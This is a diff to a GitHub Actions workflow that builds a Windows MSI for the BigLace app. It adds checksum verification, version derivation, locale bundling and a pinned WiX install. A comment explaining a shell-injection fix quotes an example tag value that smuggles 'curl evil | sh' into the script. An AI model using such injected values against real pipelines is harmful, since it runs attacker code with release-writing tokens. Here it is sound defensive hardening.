@@ -35,6 +35,12 @@ env:
   # release. Bump deliberately (read the gvsbuild release notes — sometimes
   # they break ABI). Latest known-good as of 2026-05.
   GVSBUILD_VERSION: '2026.4.1'
+  # SHA-256 of GTK4_Gvsbuild_<version>_x64.zip. These DLLs are redistributed
+  # to end users inside the MSI, so a re-tagged/compromised upstream release
+  # would ship tainted binaries. Fill this in when bumping GVSBUILD_VERSION
+  # (compute with `Get-FileHash` / `sha256sum` on the downloaded zip); left
+  # empty the download step only warns instead of failing.
+  GVSBUILD_SHA256: ''
   # Rust target. Use MSVC over GNU because gvsbuild ships MSVC import libs.
   TARGET: 'x86_64-pc-windows-msvc'
 
@@ -51,12 +57,41 @@ jobs:
       - name: Resolve tag
         id: resolve
         shell: bash
+        # Pass the untrusted values through env, never interpolated straight
+        # into the script body — a repository_dispatch payload like
+        # `tag_name: '"; curl evil | sh; echo "'` would otherwise run on the
+        # runner with a token that can write releases.
+        env:
+          PAYLOAD_TAG: ${{ github.event.client_payload.tag_name }}
+          INPUT_TAG: ${{ github.event.inputs.tag }}
+          REF_NAME: ${{ github.ref_name }}
         run: |
-          tag="${{ github.event.client_payload.tag_name }}"
-          if [ -z "$tag" ]; then tag="${{ github.event.inputs.tag }}"; fi
-          if [ -z "$tag" ]; then tag="${{ github.ref_name }}"; fi
+          tag="$PAYLOAD_TAG"
+          if [ -z "$tag" ]; then tag="$INPUT_TAG"; fi
+          if [ -z "$tag" ]; then tag="$REF_NAME"; fi
           echo "tag=$tag" >> "$GITHUB_OUTPUT"
           echo "Resolved tag: $tag"
+
+      # MSI ProductVersion must be numeric x.y.z (each < 65536). Derive it from
+      # the tag (releases use date-based tags like 26.06.07). Without a version
+      # that changes per release, MajorUpgrade never fires and every install
+      # stacks as a new "BigLace" entry.
+      - name: Resolve MSI version
+        id: msiver
+        shell: pwsh
+        env:
+          TAG: ${{ steps.resolve.outputs.tag }}
+        run: |
+          $t = $env:TAG -replace '^v',''
+          $nums = [regex]::Matches($t, '\d+') | ForEach-Object { [int]$_.Value }
+          $parts = @(0, 0, 0)
+          for ($i = 0; $i -lt [Math]::Min(3, $nums.Count); $i++) {
+              $parts[$i] = [Math]::Min(65534, $nums[$i])
+          }
+          $ver = "$($parts[0]).$($parts[1]).$($parts[2])"
+          if ($ver -eq '0.0.0') { $ver = '1.0.0' }
+          echo "version=$ver" >> $env:GITHUB_OUTPUT
+          Write-Host "MSI ProductVersion: $ver"
 
       - name: Checkout
         uses: actions/checkout@v4
@@ -102,6 +137,17 @@ jobs:
           Write-Host "Downloading $url"
           New-Item -ItemType Directory -Path C:\gtk-build\gtk\x64\release -Force | Out-Null
           Invoke-WebRequest -Uri $url -OutFile gtk4.zip -UseBasicParsing
+          # Verify the archive before we trust its DLLs in the shipped MSI.
+          $expected = "${{ env.GVSBUILD_SHA256 }}"
+          if ($expected) {
+              $actual = (Get-FileHash gtk4.zip -Algorithm SHA256).Hash
+              if ($actual -ne $expected.ToUpper()) {
+                  throw "gvsbuild checksum mismatch: expected $expected, got $actual"
+              }
+              Write-Host "gvsbuild checksum verified."
+          } else {
+              Write-Host "::warning::GVSBUILD_SHA256 not set; skipping checksum verification of the redistributed GTK runtime."
+          }
           Expand-Archive -Path gtk4.zip -DestinationPath C:\gtk-build\gtk\x64\release -Force
           Remove-Item gtk4.zip
 
@@ -172,6 +218,15 @@ jobs:
               Copy-Item "$icons\hicolor" "$stage\share\icons\hicolor" -Recurse -ErrorAction SilentlyContinue
           }
 
+          # Compiled gettext catalogues from the repo. i18n::locale_dir() looks
+          # for them next to biglace.exe (share\locale). Without this the whole
+          # UI + tray ship English-only even though the .mo files exist in-repo.
+          $locale = "usr\share\locale"
+          if (Test-Path $locale) {
+              New-Item -ItemType Directory -Path "$stage\share\locale" -Force | Out-Null
+              Copy-Item "$locale\*" "$stage\share\locale" -Recurse
+          }
+
           Get-ChildItem $stage -Recurse | Measure-Object -Sum Length |
               ForEach-Object { Write-Host ("Staged tree size: {0:N1} MB" -f ($_.Sum / 1MB)) }
 
@@ -218,6 +273,25 @@ jobs:
         shell: pwsh
         run: cargo install cargo-wix --locked --version 0.3.9
 
+      # WiX 3.x (candle/light/heat) ships preinstalled on windows-latest today,
+      # but that image floats to new versions and can drop preinstalled tools
+      # without notice. Install a pinned WiX 3.14 when heat.exe is absent so a
+      # runner-image change can't silently break the build, and expose its bin
+      # on PATH for the harvest + build steps.
+      - name: Ensure WiX 3
+        shell: pwsh
+        run: |
+          if (-not (Get-Command heat.exe -ErrorAction SilentlyContinue)) {
+              Write-Host "heat.exe not found; installing WiX 3.14 via choco."
+              choco install wixtoolset --version 3.14.1 -y --no-progress
+              $wixBin = "C:\Program Files (x86)\WiX Toolset v3.14\bin"
+              if (Test-Path $wixBin) {
+                  echo $wixBin | Out-File -FilePath $env:GITHUB_PATH -Append -Encoding utf8
+              }
+          } else {
+              Write-Host "WiX already present: $((Get-Command heat.exe).Source)"
+          }
+
       # heat.exe scans the staged tree and emits a WiX fragment listing every
       # file as a Component. The `-cg RuntimeFiles` flag groups them under the
       # ComponentGroup name our main.wxs references via ComponentGroupRef.
@@ -240,14 +314,27 @@ jobs:
       # `-I` makes candle.exe generate a duplicate runtime.wixobj.
       - name: Build MSI
         shell: pwsh
+        env:
+          TAG: ${{ steps.resolve.outputs.tag }}
+          MSI_VERSION: ${{ steps.msiver.outputs.version }}
         run: |
+          # -C passes flags to candle (compiler), -L to light (linker).
+          # main.wxs uses util:CloseApplication, so candle needs WixUtilExtension
+          # explicitly (candle gets no default extensions). light must NOT be given
+          # it again: cargo-wix already links light with WixUtilExtension by
+          # default, so a second `-ext WixUtilExtension` makes light fail with
+          # LGHT0126 (the extension's EventManifest table collides with the already
+          # loaded copy). Hence -C only, no -L for the util extension.
+          # --install-version overrides the Cargo.toml 1.0.0 with the numeric
+          # version derived from the tag so upgrades actually replace in place.
           cargo wix `
               --no-build `
               --nocapture `
               --target ${{ env.TARGET }} `
+              --install-version $env:MSI_VERSION `
+              -C "-ext" -C "WixUtilExtension" `
               -C "-dStageDir=target\wix-stage" `
-              -L "-ext" -L "WixUtilExtension" `
-              --output "target\biglace-${{ steps.resolve.outputs.tag }}-x86_64.msi"
+              --output "target\biglace-$env:TAG-x86_64.msi"
 
       - name: Upload MSI artifact
         uses: actions/upload-artifact@v4
